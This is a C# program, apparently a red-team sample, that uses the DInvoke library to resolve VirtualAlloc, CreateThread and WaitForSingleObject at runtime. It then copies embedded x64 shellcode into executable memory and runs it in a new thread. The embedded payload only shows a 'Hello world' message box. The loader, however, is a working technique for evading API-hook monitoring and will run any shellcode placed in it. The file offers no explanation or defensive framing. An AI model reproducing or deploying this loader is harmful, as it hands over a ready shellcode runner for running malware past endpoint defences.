﻿using System;
using System.Runtime.InteropServices;

// DInvoke import
using Data = DInvoke.Data;
using Invoke = DInvoke.DynamicInvoke;

namespace DInvoke_VirtualAlloc
{
    internal class Program
    {

        // Delegates of functions
        private delegate IntPtr dVirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate IntPtr dCreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        private delegate UInt32 dWaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        // Shellcode as global
        private static byte[] sc = new byte[] { 0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x8d, 0x15, 0x66, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x52, 0x00, 0x00, 0x00, 0xe8, 0x9e, 0x00, 0x00, 0x00, 0x4c, 0x8b, 0xf8, 0x48, 0x8d, 0x0d, 0x5d, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x48, 0x8d, 0x15, 0x5f, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x4d, 0x00, 0x00, 0x00, 0xe8, 0x7f, 0x00, 0x00, 0x00, 0x4d, 0x33, 0xc9, 0x4c, 0x8d, 0x05, 0x61, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x4e, 0x00, 0x00, 0x00, 0x48, 0x33, 0xc9, 0xff, 0xd0, 0x48, 0x8d, 0x15, 0x56, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x0a, 0x00, 0x00, 0x00, 0xe8, 0x56, 0x00, 0x00, 0x00, 0x48, 0x33, 0xc9, 0xff, 0xd0, 0x4b, 0x45, 0x52, 0x4e, 0x45, 0x4c, 0x33, 0x32, 0x2e, 0x44, 0x4c, 0x4c, 0x00, 0x4c, 0x6f, 0x61, 0x64, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x41, 0x00, 0x55, 0x53, 0x45, 0x52, 0x33, 0x32, 0x2e, 0x44, 0x4c, 0x4c, 0x00, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6f, 0x78, 0x41, 0x00, 0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x77, 0x6f, 0x72, 0x6c, 0x64, 0x00, 0x4d, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x00, 0x45, 0x78, 0x69, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x00, 0x48, 0x83, 0xec, 0x28, 0x65, 0x4c, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x40, 0x18, 0x4d, 0x8d, 0x60, 0x10, 0x4d, 0x8b, 0x04, 0x24, 0xfc, 0x49, 0x8b, 0x78, 0x60, 0x48, 0x8b, 0xf1, 0xac, 0x84, 0xc0, 0x74, 0x26, 0x8a, 0x27, 0x80, 0xfc, 0x61, 0x7c, 0x03, 0x80, 0xec, 0x20, 0x3a, 0xe0, 0x75, 0x08, 0x48, 0xff, 0xc7, 0x48, 0xff, 0xc7, 0xeb, 0xe5, 0x4d, 0x8b, 0x00, 0x4d, 0x3b, 0xc4, 0x75, 0xd6, 0x48, 0x33, 0xc0, 0xe9, 0xa7, 0x00, 0x00, 0x00, 0x49, 0x8b, 0x58, 0x30, 0x44, 0x8b, 0x4b, 0x3c, 0x4c, 0x03, 0xcb, 0x49, 0x81, 0xc1, 0x88, 0x00, 0x00, 0x00, 0x45, 0x8b, 0x29, 0x4d, 0x85, 0xed, 0x75, 0x08, 0x48, 0x33, 0xc0, 0xe9, 0x85, 0x00, 0x00, 0x00, 0x4e, 0x8d, 0x04, 0x2b, 0x45, 0x8b, 0x71, 0x04, 0x4d, 0x03, 0xf5, 0x41, 0x8b, 0x48, 0x18, 0x45, 0x8b, 0x50, 0x20, 0x4c, 0x03, 0xd3, 0xff, 0xc9, 0x4d, 0x8d, 0x0c, 0x8a, 0x41, 0x8b, 0x39, 0x48, 0x03, 0xfb, 0x48, 0x8b, 0xf2, 0xa6, 0x75, 0x08, 0x8a, 0x06, 0x84, 0xc0, 0x74, 0x09, 0xeb, 0xf5, 0xe2, 0xe6, 0x48, 0x33, 0xc0, 0xeb, 0x4e, 0x45, 0x8b, 0x48, 0x24, 0x4c, 0x03, 0xcb, 0x66, 0x41, 0x8b, 0x0c, 0x49, 0x45, 0x8b, 0x48, 0x1c, 0x4c, 0x03, 0xcb, 0x41, 0x8b, 0x04, 0x89, 0x49, 0x3b, 0xc5, 0x7c, 0x2f, 0x49, 0x3b, 0xc6, 0x73, 0x2a, 0x48, 0x8d, 0x34, 0x18, 0x48, 0x8d, 0x7c, 0x24, 0x30, 0x4c, 0x8b, 0xe7, 0xa4, 0x80, 0x3e, 0x2e, 0x75, 0xfa, 0xa4, 0xc7, 0x07, 0x44, 0x4c, 0x4c, 0x00, 0x49, 0x8b, 0xcc, 0x41, 0xff, 0xd7, 0x49, 0x8b, 0xcc, 0x48, 0x8b, 0xd6, 0xe9, 0x14, 0xff, 0xff, 0xff, 0x48, 0x03, 0xc3, 0x48, 0x83, 0xc4, 0x28, 0xc3 };
        private static int scSize = sc.Length;

        static void Main(string[] args)
        {
            IntPtr pAllocateMemory  = IntPtr.Zero;
            IntPtr pMakeThread      = IntPtr.Zero;
            IntPtr pWaitForObject   = IntPtr.Zero; 

            IntPtr k32 = Invoke.Generic.GetPebLdrModuleEntry("kernel32.dll");
            if (k32 == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed getting a pointer to kernel32         -> 0x{0:X}", k32.ToString());
                return;     
            } else
            {
                Console.WriteLine("[*] Pointer to kernel32                          -> 0x{0:X}", k32.ToString());
                Console.WriteLine("[*] Getting pointers to functions now...");
            }

            pAllocateMemory     = Invoke.Generic.GetExportAddress(k32, "VirtualAlloc");
            pMakeThread         = Invoke.Generic.GetExportAddress(k32, "CreateThread");
            pWaitForObject      = Invoke.Generic.GetExportAddress(k32, "WaitForSingleObject");

            if (pAllocateMemory == IntPtr.Zero || pMakeThread == IntPtr.Zero || pWaitForObject == IntPtr.Zero)
            {
                Console.WriteLine("[*] Failed getting a pointer to functions");
                return;
            }

            Console.WriteLine("[*] Pointer to VirtualAlloc          -> 0x{0:X}", k32.ToInt64());
            Console.WriteLine("[*] Pointer to CreateThread          -> 0x{0:X}", k32.ToInt64());
            Console.WriteLine("[*] Pointer to WaitForSingleObject   -> 0x{0:X}", k32.ToInt64());

            object[] allocParams = { IntPtr.Zero, (uint)scSize, (uint)0x1000 | (uint)0x2000, (uint)0x40 };
            IntPtr iAllocateMemory = (IntPtr)Invoke.Generic.DynamicFunctionInvoke(pAllocateMemory, typeof(dVirtualAlloc), ref allocParams);
            Console.WriteLine("[*] Allocate memory pointer          -> 0x{0:X}", iAllocateMemory.ToInt64());

            Marshal.Copy(sc, 0, iAllocateMemory, scSize);

            object[] threadParams = { IntPtr.Zero,  (uint)0x0, iAllocateMemory, IntPtr.Zero, (uint)0x0, IntPtr.Zero};
            IntPtr iMakeThread = (IntPtr)Invoke.Generic.DynamicFunctionInvoke(pMakeThread, typeof(dCreateThread), ref threadParams);

            object[] waitObjectParams = { iMakeThread, 0xFFFFFFFF };
            uint iWaitForObject = (uint)Invoke.Generic.DynamicFunctionInvoke(pWaitForObject, typeof(dWaitForSingleObject), ref waitObjectParams);
        }
    }
}